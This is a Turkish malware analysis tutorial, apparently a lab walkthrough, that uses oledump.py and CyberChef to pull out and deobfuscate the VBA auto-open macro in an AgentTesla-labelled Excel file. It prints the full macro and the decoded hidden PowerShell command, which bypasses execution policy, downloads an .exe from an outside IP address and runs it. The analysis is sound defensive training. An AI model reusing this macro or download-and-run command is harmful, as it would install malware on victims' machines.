## Oledump.py ile OLE2 Dosya Analizi

**Oledump.py**, yaygın olarak **Structured Storage** veya **Compound File Binary Format** olarak adlandırılan **OLE2** dosyalarını analiz eden Python tabanlı bir araçtır. **OLE** (Object Linking and Embedding), Microsoft tarafından geliştirilmiş tescilli bir teknolojidir. **OLE2** dosyaları genellikle belgeler, e-tablolar ve sunumlar gibi birden fazla veri türünü tek bir dosya içinde depolamak için kullanılır. Bu araç, **OLE2** dosyalarının içeriğini ayıklamak ve incelemek için son derece kullanışlıdır; bu da onu adli bilişim analizi (**forensic analysis**) ve kötü amaçlı yazılım tespiti (**malware detection**) için değerli bir kaynak haline getirir.

Hadi başlayalım! REMnux sanal makinesini (VM) kullanarak `/home/ubuntu/Desktop/tasks/agenttesla/` dizinine gidin. Hedef dosyamızın adı `agenttesla.xlsm`. `oledump.py agenttesla.xlsm` komutunu çalıştırın. Aşağıdaki terminal çıktısına bakın:

### Terminal

```
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

OleDump'ın dosya analizine dayanarak, belgenin içine gömülü bir **VBA script** olabileceği ve bunun `xl/vbaProject.bin` içinde bulunduğu anlaşılmaktadır. Bu nedenle oledump buna **A** indeksini atayacaktır (bu bazen değişiklik gösterebilir). **A** (indeks) + Sayılar şeklindeki ifadelere **data streams** (veri akışları) denir.

Burada büyük **M** harfine sahip veri akışına (**data stream**) özellikle dikkat etmeliyiz. Bu harf, içeride bir **Macro** (Makro) olduğu anlamına gelir ve `VBA/ThisWorkbook` veri akışını kontrol etmek isteyebilirsiniz.

Öyleyse kontrol edelim! `oledump.py agenttesla.xlsm -s 4` komutunu çalıştırın. Bu komut, oledump aracını çalıştıracak ve `-s 4` parametresini kullanarak doğrudan ilgilendiğimiz veri akışının içine bakacaktır. Buradaki `-s` parametresi **-select** ifadesinin kısaltmasıdır ve `4` sayısı da ilgilendiğimiz veri akışının 4. sırada olmasından kaynaklanır (`A4: M 688 'VBA/ThisWorkbook'`).

### Terminal

Plaintext

```
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
```

**Sonuçları Görüntüle (View Results)**

### Terminal

Plaintext

```
00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V
00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = "Thi.s
00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k"....Ba
00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-
00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|
00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..
00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl
00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id
00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru.."Expose..
00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri
000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..
000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O
000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt
000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s
000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc
000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,
00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^
00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^
00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 57  *h..l^*.l* *^-*W
00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S
00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.
00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA
00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o
00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 1A 73  l^icy..b.*yp^^.s
00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  ss *;* $.MFi.lA.=
00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..
000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..
000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.
000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $
000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$
000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..
000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke
00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est 
00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i ""http.:/
00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/
00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf
00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ...."" -.c*.'.4.
00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s
00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., 
00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h"*"..".}..^I..e
00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw("WSc
00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....
000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..
```

Yukarıdaki sonuçlar **hex dump** formatındadır. Deneyimli bir göz için bazı tanıdık kelimeler seçilebilir olsa da, bunu bu haliyle analiz etmek hala oldukça zor, değil mi? O halde çıktıyı daha okunabilir ve anlaşılır hale getirelim.

Önceki komuta ek olarak `--vbadecompress` parametresini çalıştıracağız. Bu parametreyi kullandığımızda oledump, bulduğu tüm sıkıştırılmış VBA makrolarını otomatik olarak açarak (**decompress**) daha okunabilir bir formata getirecektir.

### Terminal


```
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
```


### Terminal


```
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```

Bu çok daha iyi, değil mi? Artık tüm scripti tamamen okuyabilmemiz gerekmiyor; bunun yerine bazı karakterlere ve komutlara aşina olmamız yeterli. Burada ilgilendiğimiz kısım **Sqtnew** değişkeninin değeri olacaktır; çünkü scripti kontrol ederseniz içinde bir **Public IP**, bir PDF ve bir `.exe` ifadesi yer alıyor. Bunu daha detaylı incelemek isteyebiliriz.

### Terminal


```
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

---

## CyberChef ile Obfuscation Çözümü

**Sqtnew**'in ilk değerini kopyalayacağız ve CyberChef'in **input** alanına yapıştıracağız. REMnux VM içindeki yerel bir CyberChef kopyasını açabilir veya çevrimiçi sürüme erişmek için ilgili bağlantıyı kullanabilirsiniz. Hangisi sizin için uygunsa onu seçin.

Ardından, iki kez **Find/Replace** işlemini seçin. Scripte geri dönüp baktığımızda, **Sqtnew**'in 2. ve 3. değerlerinde `*` karakterini `""` ile ve `^` karakterini `""` ile değiştiren bir komut bulunuyor. Buradaki `""` ifadesinin boş bir değer anlamına geldiğini varsayıyoruz.

1. **İlk Find/Replace İşlemi:** Find kutusuna `*` yazın ve ek parametre olarak **SIMPLE STRING** seçeneğini işaretleyin. **Replace** kutusunu ise tamamen boş bırakın (herhangi bir değer girmeyin).
    
2. **İkinci Find/Replace İşlemi:** Find kutusuna `^` yazın ve yine **SIMPLE STRING** seçeneğini seçin. **Replace** kutusunu yine boş bırakın.
    

Artık metin çok daha okunabilir durumda! Ancak yeni başlayanlar için bu hala zorlayıcı olabilir. Bu yüzden buradaki en temel komutları ele alacağız:

### Terminal

Plaintext

```
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

Hadi parçalara ayıralım!

- **-WindowStyle hidden:** PowerShell'de bu parametreyi çalıştırmak, bir script veya komut yürütülürken PowerShell penceresinin nasıl görüneceğini kontrol etmenizi sağlar. Bu durumda `hidden`, PowerShell penceresinin kullanıcıya görünmeyeceği anlamına gelir.
    
- **-executionpolicy bypass:** Varsayılan olarak PowerShell, güvenlik nedenleriyle script yürütülmesini kısıtlar. Bu parametre, söz konusu politikayı geçersiz kılmanıza olanak tanır. `bypass`, yürütme politikasının geçici olarak yok sayıldığı ve herhangi bir scriptin kısıtlama olmaksıznyıl çalışmasına izin verildiği anlamına gelir.
    
- **Invoke-WebRequest:** Genellikle internetten dosya indirmek için kullanılır.
    
- **-Uri:** Almak istediğiniz web kaynağının URL'sini belirtir. Bizim durumumuzda script, `[http://193.203.203.67/rt/](http://193.203.203.67/rt/)` adresinden `Doc-3737122pdf.exe` kaynağını indirmektedir.
    
- **-OutFile:** İndirilen içeriğin kaydedileceği yerel dosya yolunu belirtir. Bu senaryoda `Doc-3737122pdf.exe` dosyası `$TempFile` değişkenine kaydedilecektir.
    
- **Start-Process:** Web isteğinden sonra indirilerek `$TempFile` içinde depolanan dosyayı yürütmek (çalıştırmak) için kullanılır.
    

---

### Özet

Özetlemek gerekirse, `agenttesla.xlsm` belgesi açıldığında bir **Macro** çalışacaktır! Bu makro bir **VBA script** içerir. Script çalışacak ve `[http://193.203.203.67/rt/](http://193.203.203.67/rt/)` adresinden `Doc-3737122pdf.exe` adlı bir dosyayı indirmek için arka planda bir PowerShell oturumu başlatacaktır. İndirilen bu dosyayı `$TempFile` değişkenine kaydedecek, ardından bu değişkenin içindeki dosyayı yani bir binary veya `.exe` dosyasını (`Doc-3737122pdf.exe`) yürütecektir.

Bu, saldırganlar (**threat actors**) tarafından erken tespiti (**early detection**) önlemek için sıklıkla kullanılan tipik bir tekniktir. Oldukça sinsi, değil mi? Bunu çözmeyi başardığınız için tebrikler!